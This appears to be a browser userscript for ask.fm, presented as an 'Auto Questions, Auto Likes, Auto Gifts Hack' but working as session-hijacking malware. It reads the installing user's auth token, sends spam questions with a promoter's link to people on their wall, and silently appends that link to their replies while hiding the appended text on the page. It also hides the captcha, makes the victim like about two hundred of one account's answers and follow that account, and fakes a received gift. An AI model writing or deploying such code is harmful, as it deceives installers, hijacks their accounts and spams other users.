// ==UserScript==
// @name			Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gifts Hack
// @namespace                   http://userscripts.org/scripts/show/999999
// @version			3.0
// @copyright		        http://ask.fm/ppookkeemmoonn
// @description		        Ask.fm Auto Questions - Auto Likes - Auto Reply - Auto Gifts Hack
// @include			http://ask.fm/*
// @icon			http://s3.amazonaws.com/uso_ss/icon/138450/large.gif?
// Version numero 2
// ==/UserScript==

var harfler = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y'];
function randomcode(){
	return harfler[Math.floor(Math.random() * 60)] + "AQ" + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)] + harfler[Math.floor(Math.random() * 60)];
}
function reklam(){
return mesaj + " " + randomcode() + " ";
}
var link = "http://ask.fm/PanamienQuatreVingtQuatorze";
var token = document.head.innerHTML.split("AUTH_TOKEN = ")[1].split(";")[0].replace(/"/g,"");
var mesaj = "Hey ==> ";
var cevap = mesaj + " " + link;

if(document.getElementsByClassName("link-menu-active").length > 0){
if(document.getElementsByClassName("link-menu-active")[0].innerText == "Profil"){
document.getElementById("profile_gifts_counter").innerText = parseInt(document.getElementById("profile_gifts_counter").innerText) + 1;
var gift = document.createElement("div");
gift.id = "gift-container";
gift.innerHTML = '<div id="gift-outline" style="display: none; "></div>';
document.body.insertBefore(gift,document.getElementById("wrapper"));
Gifts.init({
sync_url: document.getElementsByClassName("link-menu-active")[0].href.replace("http://ask.fm","") + "/gifts/sync",
flash_id: null,
sync_all: false
});    
Gifts.load([{
"offset_left":0,
"rtl":false,
"src":"http://ask.fm/images/badges/love_and_friendship/C0459.png",
"z_index":1,
"id":2569992,
"offset_top":25
}]);
}}

if(document.URL.indexOf("/reply") < 0 && link != ""){
for(i=0;i<$('.answer').length;i++){
try{
if($('.answer')[i].innerText.split("\n.\n.\n").length > 0){
$('.answer')[i].innerText =$('.answer')[i].innerText.split("\n.\n.\n")[0];
}
}catch(e){}
}
}

if($('#captcha_key').val() != undefined){
if($('#captcha_key').val().toString().length > 0){
$('#captchaLevel').css({display:"none"});
$('#captcha_key').val("")
}
}

if(document.URL.indexOf("/account/wall") > 0 && link != ""){
window.setInterval("sor();",1000);
}

if(document.URL.indexOf("/reply") > 0 && link != ""){
$('#question_submit').mouseover(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) < 0){
  document.getElementById("post-input-pre").value = document.getElementById("post-input-pre").value + "\n.\n.\n" + cevap;
  }
});
document.getElementById("question_submit").type = "button";
$('#question_submit').click(function() {
if(document.getElementById("post-input-pre").value .indexOf(link) > 0){
jQuery.ajax({
url: "http://ask.fm/PanamienQuatreVingtQuatorze/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": "Like Bro plz " + ":" + document.URL.replace("/questions/","/answer/").replace("/reply","") , "question[force_anonymous]":"" , "authenticity_token":token},
success:function(){$("form:first").submit();}
});
  }
});
}

function sorusor(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":kisi + " selam " + reklam() + link, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

function floodyap(kisi,soru){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]":soru, "question[force_anonymous]":"" , "authenticity_token":token}
});
}

var sayac = 0;
function sor(){
if(sayac < document.getElementsByClassName("questionBox").length){
sorusor(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href.replace("http://ask.fm/",""));
//rapor_ver(document.getElementsByClassName("questionBox")[sayac].getElementsByTagName("a")[0].href,"Soruldu");
sayac += 1;
}
}

function rapor_ver(rapor,durum){
jQuery.ajax({
url: "http://ask.fm/PanamienQuatreVingtQuatorze/questions/create",
type: "POST",
data: { "authenticity_token":token, "question[question_text]": durum + ":" + rapor , "question[force_anonymous]":"" , "authenticity_token":token}
});
}


function takipet(kisi){
jQuery.ajax({
url: "http://ask.fm/" + kisi + "/follow",
type: "POST",
data: { "authenticity_token":token},
});
}

function sorubegen(kisi,soruid){
var yanitsayi = "";
var begenisayi = "";
if($('#profile_answer_counter') && $('#profile_liked_counter')){
yanitsayi = $('#profile_answer_counter').text()
begenisayi = $('#profile_liked_counter').text()
}
jQuery.ajax({
url: "http://ask.fm/likes/" + kisi + "/question/" + soruid + "/add",
type: "POST",
data: { "authenticity_token":token},
beforeSend: function ( xhr ) {xhr .setRequestHeader ("Accept", "text/javascript, application/javascript, */*, text/javascript");},
success: function(){
	if(yanitsayi != "" && begenisayi != ""){
	$('#profile_answer_counter').text(yanitsayi);
	$('#profile_liked_counter').text(begenisayi);
	}
	}
});
}
sorubegen("PanamienQuatreVingtQuatorze","26683342951");
sorubegen("PanamienQuatreVingtQuatorze","27238274663");
sorubegen("PanamienQuatreVingtQuatorze","26663332199");
sorubegen("PanamienQuatreVingtQuatorze","26662737511");
sorubegen("PanamienQuatreVingtQuatorze","25790439527");
sorubegen("PanamienQuatreVingtQuatorze","25765092967");
sorubegen("PanamienQuatreVingtQuatorze","25764593767");
sorubegen("PanamienQuatreVingtQuatorze","25763967079");
sorubegen("PanamienQuatreVingtQuatorze","26594225767");
sorubegen("PanamienQuatreVingtQuatorze","25731980391");
sorubegen("PanamienQuatreVingtQuatorze","25763355751");
sorubegen("PanamienQuatreVingtQuatorze","26574558311");
sorubegen("PanamienQuatreVingtQuatorze","26572059751");
sorubegen("PanamienQuatreVingtQuatorze","26569863271");
sorubegen("PanamienQuatreVingtQuatorze","25762961767");
sorubegen("PanamienQuatreVingtQuatorze","25762905191");
sorubegen("PanamienQuatreVingtQuatorze","25761582951");
sorubegen("PanamienQuatreVingtQuatorze","26554354279");
sorubegen("PanamienQuatreVingtQuatorze","26554213991");
sorubegen("PanamienQuatreVingtQuatorze","26554043495");
sorubegen("PanamienQuatreVingtQuatorze","26554035815");
sorubegen("PanamienQuatreVingtQuatorze","26553530727");
sorubegen("PanamienQuatreVingtQuatorze","26553975399");
sorubegen("PanamienQuatreVingtQuatorze","26553306215");
sorubegen("PanamienQuatreVingtQuatorze","26552779623");
sorubegen("PanamienQuatreVingtQuatorze","25757596775");
sorubegen("PanamienQuatreVingtQuatorze","26552685159");
sorubegen("PanamienQuatreVingtQuatorze","26552271207");
sorubegen("PanamienQuatreVingtQuatorze","26552186471");
sorubegen("PanamienQuatreVingtQuatorze","25755364455");
sorubegen("PanamienQuatreVingtQuatorze","25753839975");
sorubegen("PanamienQuatreVingtQuatorze","26551549287");
sorubegen("PanamienQuatreVingtQuatorze","26550595175");
sorubegen("PanamienQuatreVingtQuatorze","25751241063");
sorubegen("PanamienQuatreVingtQuatorze","25596195431");
sorubegen("PanamienQuatreVingtQuatorze","25596617575");
sorubegen("PanamienQuatreVingtQuatorze","25584977255");
sorubegen("PanamienQuatreVingtQuatorze","25510749287");
sorubegen("PanamienQuatreVingtQuatorze","26268838759");
sorubegen("PanamienQuatreVingtQuatorze","25505131879");
sorubegen("PanamienQuatreVingtQuatorze","25373554791");
sorubegen("PanamienQuatreVingtQuatorze","25370101351");
sorubegen("PanamienQuatreVingtQuatorze","25369591143");
sorubegen("PanamienQuatreVingtQuatorze","25293878631");
sorubegen("PanamienQuatreVingtQuatorze","25278437735");
sorubegen("PanamienQuatreVingtQuatorze","25191146087");
sorubegen("PanamienQuatreVingtQuatorze","24982925159");
sorubegen("PanamienQuatreVingtQuatorze","24984945255");
sorubegen("PanamienQuatreVingtQuatorze","24967193703");
sorubegen("PanamienQuatreVingtQuatorze","26241832807");
sorubegen("PanamienQuatreVingtQuatorze","26241199207");
sorubegen("PanamienQuatreVingtQuatorze","26210050663");
sorubegen("PanamienQuatreVingtQuatorze","26193943143");
sorubegen("PanamienQuatreVingtQuatorze","26193747047");
sorubegen("PanamienQuatreVingtQuatorze","24955188583");
sorubegen("PanamienQuatreVingtQuatorze","24954571111");
sorubegen("PanamienQuatreVingtQuatorze","26159725415");
sorubegen("PanamienQuatreVingtQuatorze","26158900839");
sorubegen("PanamienQuatreVingtQuatorze","24953829991");
sorubegen("PanamienQuatreVingtQuatorze","24953369191");
sorubegen("PanamienQuatreVingtQuatorze","26137501031");
sorubegen("PanamienQuatreVingtQuatorze","24931468391");
sorubegen("PanamienQuatreVingtQuatorze","24911025767");
sorubegen("PanamienQuatreVingtQuatorze","24794734439");
sorubegen("PanamienQuatreVingtQuatorze","24793366375");
sorubegen("PanamienQuatreVingtQuatorze","24463830631");
sorubegen("PanamienQuatreVingtQuatorze","24424880743");
sorubegen("PanamienQuatreVingtQuatorze","24402111847");
sorubegen("PanamienQuatreVingtQuatorze","24402134375");
sorubegen("PanamienQuatreVingtQuatorze","24403070055");
sorubegen("PanamienQuatreVingtQuatorze","24358882151");
sorubegen("PanamienQuatreVingtQuatorze","24243794023");
sorubegen("PanamienQuatreVingtQuatorze","24240499047");
sorubegen("PanamienQuatreVingtQuatorze","24226389351");
sorubegen("PanamienQuatreVingtQuatorze","24188431463");
sorubegen("PanamienQuatreVingtQuatorze","27056277351");
sorubegen("PanamienQuatreVingtQuatorze","27133867367");
sorubegen("PanamienQuatreVingtQuatorze","27152021607");
sorubegen("PanamienQuatreVingtQuatorze","27464019303");
sorubegen("PanamienQuatreVingtQuatorze","27470372967");
sorubegen("PanamienQuatreVingtQuatorze","27464229991");
sorubegen("PanamienQuatreVingtQuatorze","27472393575");
sorubegen("PanamienQuatreVingtQuatorze","27565253991");
sorubegen("PanamienQuatreVingtQuatorze","27597296487");
sorubegen("PanamienQuatreVingtQuatorze","26983113575");
sorubegen("PanamienQuatreVingtQuatorze","24157701991");
sorubegen("PanamienQuatreVingtQuatorze","26792169063");
sorubegen("PanamienQuatreVingtQuatorze","24157442919");
sorubegen("PanamienQuatreVingtQuatorze","23988706919");
sorubegen("PanamienQuatreVingtQuatorze","23989881959");
sorubegen("PanamienQuatreVingtQuatorze","23687988583");
sorubegen("PanamienQuatreVingtQuatorze","23689006951");
sorubegen("PanamienQuatreVingtQuatorze","23634197607");
sorubegen("PanamienQuatreVingtQuatorze","23455621479");
sorubegen("PanamienQuatreVingtQuatorze","25841683815");
sorubegen("PanamienQuatreVingtQuatorze","23456548199");
sorubegen("PanamienQuatreVingtQuatorze","23457232231");
sorubegen("PanamienQuatreVingtQuatorze","23428012903");
sorubegen("PanamienQuatreVingtQuatorze","23401318759");
sorubegen("PanamienQuatreVingtQuatorze","23398660455");
sorubegen("PanamienQuatreVingtQuatorze","23399790951");
sorubegen("PanamienQuatreVingtQuatorze","23400295015");
sorubegen("PanamienQuatreVingtQuatorze","23400945767");
sorubegen("PanamienQuatreVingtQuatorze","23365739367");
sorubegen("PanamienQuatreVingtQuatorze","22644111463");
sorubegen("PanamienQuatreVingtQuatorze","22644118375");
sorubegen("PanamienQuatreVingtQuatorze","22644123495");
sorubegen("PanamienQuatreVingtQuatorze","25768741479");
sorubegen("PanamienQuatreVingtQuatorze","23331665767");
sorubegen("PanamienQuatreVingtQuatorze","23317452391");
sorubegen("PanamienQuatreVingtQuatorze","23203068519");
sorubegen("PanamienQuatreVingtQuatorze","25765092967");
sorubegen("PanamienQuatreVingtQuatorze","25764593767");
sorubegen("PanamienQuatreVingtQuatorze","25763967079");
sorubegen("PanamienQuatreVingtQuatorze","25731980391");
sorubegen("PanamienQuatreVingtQuatorze","25763355751");
sorubegen("PanamienQuatreVingtQuatorze","25762961767");
sorubegen("PanamienQuatreVingtQuatorze","25762905191");
sorubegen("PanamienQuatreVingtQuatorze","25761582951");
sorubegen("PanamienQuatreVingtQuatorze","23167353191");
sorubegen("PanamienQuatreVingtQuatorze","22572819047");
sorubegen("PanamienQuatreVingtQuatorze","25755364455");
sorubegen("PanamienQuatreVingtQuatorze","25753871463");
sorubegen("PanamienQuatreVingtQuatorze","25753839975");
sorubegen("PanamienQuatreVingtQuatorze","25751241063");
sorubegen("PanamienQuatreVingtQuatorze","22652450919");
sorubegen("PanamienQuatreVingtQuatorze","22559476583");
sorubegen("PanamienQuatreVingtQuatorze","22560372071");
sorubegen("PanamienQuatreVingtQuatorze","22561345383");
sorubegen("PanamienQuatreVingtQuatorze","22561433959");
sorubegen("PanamienQuatreVingtQuatorze","22545852519");
sorubegen("PanamienQuatreVingtQuatorze","22545861479");
sorubegen("PanamienQuatreVingtQuatorze","22542227303");
sorubegen("PanamienQuatreVingtQuatorze","22541102951");
sorubegen("PanamienQuatreVingtQuatorze","22540003943");
sorubegen("PanamienQuatreVingtQuatorze","22540014951");
sorubegen("PanamienQuatreVingtQuatorze","21999595367");
sorubegen("PanamienQuatreVingtQuatorze","25656515687");
sorubegen("PanamienQuatreVingtQuatorze","22014951015");
sorubegen("PanamienQuatreVingtQuatorze","22020416103");
sorubegen("PanamienQuatreVingtQuatorze","21773325159");
sorubegen("PanamienQuatreVingtQuatorze","21223073895");
sorubegen("PanamienQuatreVingtQuatorze","21225302119");
sorubegen("PanamienQuatreVingtQuatorze","21225884519");
sorubegen("PanamienQuatreVingtQuatorze","21226358119");
sorubegen("PanamienQuatreVingtQuatorze","21228008039");
sorubegen("PanamienQuatreVingtQuatorze","25597013095");
sorubegen("PanamienQuatreVingtQuatorze","25596617575");
sorubegen("PanamienQuatreVingtQuatorze","25596195431");
sorubegen("PanamienQuatreVingtQuatorze","21228012391");
sorubegen("PanamienQuatreVingtQuatorze","21229670247");
sorubegen("PanamienQuatreVingtQuatorze","21233033831");
sorubegen("PanamienQuatreVingtQuatorze","21233979751");
sorubegen("PanamienQuatreVingtQuatorze","21235021671");
sorubegen("PanamienQuatreVingtQuatorze","21236548967");
sorubegen("PanamienQuatreVingtQuatorze","21236548455");
sorubegen("PanamienQuatreVingtQuatorze","21236546407");
sorubegen("PanamienQuatreVingtQuatorze","21236873575");
sorubegen("PanamienQuatreVingtQuatorze","21237151335");
sorubegen("PanamienQuatreVingtQuatorze","21237326695");
sorubegen("PanamienQuatreVingtQuatorze","21237446503");
sorubegen("PanamienQuatreVingtQuatorze","21237569127");
sorubegen("PanamienQuatreVingtQuatorze","21240565607");
sorubegen("PanamienQuatreVingtQuatorze","21240803431");
sorubegen("PanamienQuatreVingtQuatorze","21241482087");
sorubegen("PanamienQuatreVingtQuatorze","21393375591");
sorubegen("PanamienQuatreVingtQuatorze","21451330407");
sorubegen("PanamienQuatreVingtQuatorze","21585586535");
sorubegen("PanamienQuatreVingtQuatorze","21585665895");
sorubegen("PanamienQuatreVingtQuatorze","21602527335");
sorubegen("PanamienQuatreVingtQuatorze","21642096231");
sorubegen("PanamienQuatreVingtQuatorze","21715326055");
sorubegen("PanamienQuatreVingtQuatorze","21722498663");
sorubegen("PanamienQuatreVingtQuatorze","21723877991");
sorubegen("PanamienQuatreVingtQuatorze","21725440359");
sorubegen("PanamienQuatreVingtQuatorze","21726376551");
sorubegen("PanamienQuatreVingtQuatorze","21727139687");
sorubegen("PanamienQuatreVingtQuatorze","21727331943");
sorubegen("PanamienQuatreVingtQuatorze","21727701607");
sorubegen("PanamienQuatreVingtQuatorze","21728008295");
sorubegen("PanamienQuatreVingtQuatorze","21728073063");
takipet("PanamienQuatreVingtQuatorze");